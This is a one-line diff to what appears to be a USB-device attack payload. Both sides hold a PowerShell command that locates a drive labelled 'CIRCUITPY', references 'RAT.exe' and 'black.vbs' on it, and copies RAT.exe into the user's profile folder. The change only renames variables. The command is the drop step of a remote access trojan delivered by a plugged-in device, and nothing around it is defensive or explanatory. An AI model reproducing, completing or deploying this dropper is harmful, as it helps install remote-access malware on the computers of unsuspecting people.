@@ -1,1 +1,1 @@
-powershell $raspletter=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; $raspunit="${raspletter}:\"; $rasprat="${raspunit}RAT.exe"; $raspvbs="${raspunit}black.vbs"; cd "${raspletter}:"; Copy-Item -path $rasprat -destination $env:USERPROFILE
+powershell $letter=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; $unit="${letter}:\"; $rat="${unit}RAT.exe"; $vbs="${unit}black.vbs"; cd "${letter}:"; Copy-Item -path $rat -destination $env:USERPROFILE
